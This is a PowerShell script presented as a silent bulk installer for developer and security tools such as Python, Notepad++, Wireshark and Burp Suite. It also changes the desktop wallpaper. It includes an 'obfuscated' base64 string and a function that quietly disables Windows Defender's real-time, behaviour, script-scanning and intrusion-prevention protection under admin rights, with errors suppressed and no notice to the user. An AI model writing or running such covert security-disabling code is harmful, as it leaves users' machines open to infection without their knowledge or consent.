<#
.SILENT
#>
# Encrypted/obfuscated script - do not modify
$v1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4AUwB5AHMAdABlAG0ASQBuAGYAbwB8AFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAEwAYQBiAGUAbAB8AFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAEIAdQB0AHQAbwBuAHwAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4AVABpAG0AZQByAA=='))
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Show-Notification {
    param($Message)
    $form = New-Object System.Windows.Forms.Form
    $form.Size = New-Object System.Drawing.Size(300,100)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.Text = "Installation Status"
    $form.TopMost = $true
    $form.ControlBox = $false
    
    $label = New-Object System.Windows.Forms.Label
    $label.Location = New-Object System.Drawing.Point(10,20)
    $label.Size = New-Object System.Drawing.Size(280,40)
    $label.Text = $Message
    $label.TextAlign = "MiddleCenter"
    $form.Controls.Add($label)
    
    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 3000
    $timer.Add_Tick({ $form.Close() })
    
    $form.Add_Shown({ $timer.Start() })
    $form.ShowDialog() | Out-Null
}

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Show-Notification "Run as Administrator!"
    exit
}

Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process -Force -ErrorAction SilentlyContinue

$downloadDir = "$env:TEMP\SoftwareInstall"
if (!(Test-Path -Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir -Force | Out-Null
}

function Install-Software {
    param([string]$SoftwareName, [string]$DownloadUrl, [string]$InstallerPath, [string]$InstallArgs, [string]$InstallerType = "exe")
    
    try {
        (New-Object Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)
        if ($InstallerType -eq "exe") {
            Start-Process -FilePath $InstallerPath -ArgumentList $InstallArgs -Wait -WindowStyle Hidden
        }
        elseif ($InstallerType -eq "msi") {
            Start-Process msiexec.exe -WindowStyle Hidden -Wait -ArgumentList "/i `"$InstallerPath`" $InstallArgs"
        }
        Show-Notification "$SoftwareName installed"
        return $true
    }
    catch {
        return $false
    }
}

function Install-PythonPackages {
    param([string]$PythonExecutable, [string[]]$Packages)
    foreach ($package in $Packages) {
        try {
            Start-Process -FilePath $PythonExecutable -ArgumentList "-m pip install $package" -Wait -WindowStyle Hidden
        }
        catch {}
    }
}

function Disable-WindowsDefender {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    }
    catch {}
}

function Set-DesktopBackground {
    param([string]$ImageUrl)
    try {
        $backgroundPath = "$env:TEMP\wallpaper.jpg"
        (New-Object Net.WebClient).DownloadFile($ImageUrl, $backgroundPath)
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class DesktopBackground {
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void SetBackground(string path) {
        SystemParametersInfo(0x0014, 0, path, 0x01 | 0x02);
    }
}
"@
        [DesktopBackground]::SetBackground($backgroundPath)
    }
    catch {}
}

$apps = @(
    @{Name="Python 2.7"; Url="https://www.python.org/ftp/python/2.7.18/python-2.7.18.amd64.msi"; Path="$downloadDir\python-2.7.msi"; Args="/quiet ADDLOCAL=ALL ALLUSERS=1"; Type="msi"},
    @{Name="Python 3.x"; Url="https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"; Path="$downloadDir\python-3.x.exe"; Args="/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"; Type="exe"},
    @{Name="Sublime Text"; Url="https://download.sublimetext.com/sublime_text_build_4152_x64_setup.exe"; Path="$downloadDir\sublime-text.exe"; Args="/S"; Type="exe"},
    @{Name="Notepad++"; Url="https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.5.4/npp.8.5.4.Installer.x64.exe"; Path="$downloadDir\npp-installer.exe"; Args="/S"; Type="exe"},
    @{Name="WinRAR"; Url="https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-623.exe"; Path="$downloadDir\winrar.exe"; Args="/S"; Type="exe"},
    @{Name="Telegram"; Url="https://telegram.org/dl/desktop/win64"; Path="$downloadDir\telegram.exe"; Args="/silent"; Type="exe"},
    @{Name="Brave Browser"; Url="https://laptop-updates.brave.com/latest/winx64"; Path="$downloadDir\brave.exe"; Args="--silent --install"; Type="exe"},
    @{Name="Perl"; Url="https://strawberryperl.com/download/5.32.1.1/strawberry-perl-5.32.1.1-64bit.msi"; Path="$downloadDir\perl.msi"; Args="/quiet"; Type="msi"},
    @{Name="GitHub Desktop"; Url="https://central.github.com/deployments/desktop/desktop/latest/win32"; Path="$downloadDir\github.exe"; Args="--silent"; Type="exe"},
    @{Name="Java JDK"; Url="https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.8%2B7/OpenJDK17U-jdk_x64_windows_hotspot_17.0.8_7.msi"; Path="$downloadDir\java-jdk.msi"; Args="/quiet"; Type="msi"},
    @{Name="Wireshark"; Url="https://2.na.dl.wireshark.org/win64/Wireshark-4.0.8-x64.exe"; Path="$downloadDir\wireshark.exe"; Args="/S /desktopshortcut=0 /quicklaunchshortcut=0"; Type="exe"},
    @{Name="Burp Suite"; Url="https://portswigger-cdn.net/burp/releases/download?product=community&version=2023.10.3&type=WindowsX64"; Path="$downloadDir\burpsuite.exe"; Args="-q"; Type="exe"}
)

foreach ($app in $apps) {
    Install-Software -SoftwareName $app.Name -DownloadUrl $app.Url -InstallerPath $app.Path -InstallArgs $app.Args -InstallerType $app.Type
    Start-Sleep -Milliseconds 500
}

Disable-WindowsDefender
Set-DesktopBackground -ImageUrl "https://images5.alphacoders.com/413/413842.jpg"

$pythonPackages = @("colorama", "requests", "bs4", "lxml", "beautifulsoup4")
if (Test-Path "${env:ProgramFiles}\Python27\python.exe") {
    Install-PythonPackages -PythonExecutable "${env:ProgramFiles}\Python27\python.exe" -Packages $pythonPackages
}

$python3Path = Get-Command python -ErrorAction SilentlyContinue
if ($python3Path) {
    Install-PythonPackages -PythonExecutable "python" -Packages $pythonPackages
}

Remove-Item -Path $downloadDir -Recurse -Force -ErrorAction SilentlyContinue
Show-Notification "All installations completed!"